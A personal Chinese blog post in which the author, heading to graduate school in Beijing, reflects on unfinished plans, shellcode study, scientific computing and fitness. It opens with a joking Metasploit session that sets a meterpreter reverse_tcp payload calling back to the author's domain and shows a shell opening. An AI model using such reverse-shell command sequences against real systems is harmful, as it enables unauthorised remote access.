---
layout: post
title: "新的旅途？"
excerpt: "要去帝都了，前途未卜"
category: Life
tags: [Life]
disqus: true
---


    ~/Work/project/shellcode ⮀ ~/metasploit-framework/msfconsole
    
     ______     _     _     _____     _________  
    |  ___ \   | |   | |   |  __ \   |____ ____|  
    | |  | |   | |   | |   | |  | |      | |  
    | |__| |   | |   | |   | |__| |      | |
    |  __  |   | |   | |   |  ___/       | |
    | |  | |   | |   | |   | |           | |
    | |__| |   | |___| |   | |           | |
    |_____/    \______/    |_|           |_|
    
    
           =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
    + -- --=[ 1131 exploits - 638 auxiliary - 180 post
    + -- --=[ 309 payloads - 30 encoders - 8 nops
    
    msf > use exploit/bupt/cleader/happy_hacking
    msf exploit(happy_hacking) > set PAYLOAD bupt/meterpreter/reverse_tcp
    PAYLOAD => bupt/meterpreter/reverse_tcp
    msf exploit(happy_hacking) > set LHOST reverland.org
    LHOST => reverland.org
    msf exploit(happy_hacking) > exploit

    [*] Started reverse handler on 127.0.0.1:4444 
    [*] Starting the payload handler...
    
    [*] Command shell session 1 opened (reverland.org:4444 -> bupt.cleader:58229) at 2013-08-21 17:39:46 +0800
    
    CMD Version 1.4.1
    
    Z:\home\reverland\bupt\cleader\shellcode>
    
    ...

总觉得有太多想做的事情还没有做，别的不说，有很多文章都想写却觉得没力气去写：

1. 写写毕业季，谈谈最后大学的日子，毕业阶段的总总可笑和可叹之处。
2. 把相位去包裹中Goldstein枝切算法和最小二乘法的原理和代码到博客上写完，论文还在bitbucket上呢。最后还要写下有关技术和非技术的观点和总结。
3. windows下的shellcod书写，portbind和reverse tcp的，download and execute的，staged的、添加用户的,linux下bind 端口的，添加用户的，stage的。多态shellcode，编码加密压缩算法在shellcode编码上的应用和变化。
4. 64位汇编和32位的区别和联系，函数调用、系统调用、寄存器等等。

从上面看，大概是写shellcode写疯了，确切地说应该是学写shellcode学疯了。两年前对科学计算大概也是这样的热情吧，然而一个多月前Coursera上machine learning结课之后我却再也没回头看看，更别谈应用了。我虽知热情并非一阵风刮过，时光却总是有限，不让我回头拾起满溢一地的宝珠。

谁知道研究生阶段会做什么，也没问过，也不在乎，听传闻上属于挂羊头卖狗肉的行当，不过传闻总是很可怕的。如果可以，我以后也许想做做律师奸商销售老师公务员什么的。黑客的梦想，让她作为一个美好的爱好和梦随风而逝吧。

还有残念万千，也许会永远残念下去：

1. Python科学计算出第二版了，几年时间变化真快。不知道还有机会看么。其实就这些日子的体验来看，到底还是先接触C和Fortran，Python用户太容易浪费资源了。可惜Coursera上的高性能科学计算没看完，大致讲了讲ipython环境和fortran的用法，以及并行计算等话题。
2. 好好锻炼身体。不想因为天天坐在计算机前挂掉了，最近脖子不舒服。不是说我老在讲珍爱生命远离计算机。
3. 迷上社交工程了，哪天把The art of deception看完，hack不只在技术上啊。
4. 回头看看lisp
5. 继续痴迷地玩shellcode，免不了开始了解更多有关操作系统和通信的东西，什么ELF和PE格式啊等等。接触一大堆各个平台的迥异的工具和理念。
6. 看看前端，看看js，包括jquery/angularjs。
7. 还是很喜欢gimp，前一阵试了试一个上色插件真是太酷了
8. 马拉松么，似乎无影无踪了，但每天还是想自己去跑跑。北邮的操场离马路太近，北师的操场应该是个不错的选择。
9. 得想想怎么锻炼腰部，自从大一打篮球伤着之后一直都不舒服，久坐之后尤其。做俯卧撑时基本上都不是上肢和胸部受不了而是腰实在……

有盼头总是好的，探索和前进的愿望总是可贵的，生活斑斓多彩，有趣的东西一定不在某一个领域。

好奇之心就是黑客精神，前行之路即为人生。

祝大家安好，在人生的道路上凭借信心、智慧和勇气，Happy Hacking！
